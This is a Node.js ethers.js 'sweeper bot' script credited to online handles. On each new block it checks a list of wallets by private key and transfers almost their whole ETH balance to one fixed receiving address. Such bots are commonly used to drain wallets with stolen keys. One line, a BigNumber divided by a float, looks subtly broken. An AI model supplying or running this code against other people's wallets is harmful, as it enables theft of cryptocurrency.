const { ethers } = require("ethers");
const provider = new ethers.providers.JsonRpcProvider("JSON_RPC_URL_HERE");
const addressReceiver = "YOUR_RECEIVING_ETHEREUM_ADDRESS";
const privateKeys = ["SENDER'S_PRIVATE_KEY",
  "SENDER'S_PRIVATE_KEY",
  "SENDER'S_PRIVATE_KEY",
  "SENDER'S_PRIVATE_KEY",
  "SENDER'S_PRIVATE_KEY",
  "SENDER'S_PRIVATE_KEY",
  "SENDER'S_PRIVATE_KEY"];
    console.log("Made by @3rr0r0x0 Modified by @blackvirous");
const bot = async () => {
  provider.on("block", async () => {
    console.log("Listening new block, Waiting...");
    for (let i = 0; i < privateKeys.length; i++) {
      const _target = new ethers.Wallet(privateKeys[i]);
      const target = _target.connect(provider);
      const balance = await provider.getBalance(target.address);
      const txBuffer = ethers.utils.parseEther("MINIMUM_AMOUNT_OF_ETH");
      if (balance.sub(txBuffer) > 0) {
        console.log(`Found an account with ETH balance --> ${ethers.utils.formatEther(balance)}`);
        const amount = balance.sub(txBuffer);
        try {
          await target.sendTransaction({
            to: addressReceiver,
            value: amount
          });
          const amount_r = amount / 0.001
          console.log(`Successfully transfered your balance --> ` + amount_r);
        }
        catch (e) {
            console.log(`Finding some issues. Error! : ${e}`);
        }
      }
    }
  });
}

bot();
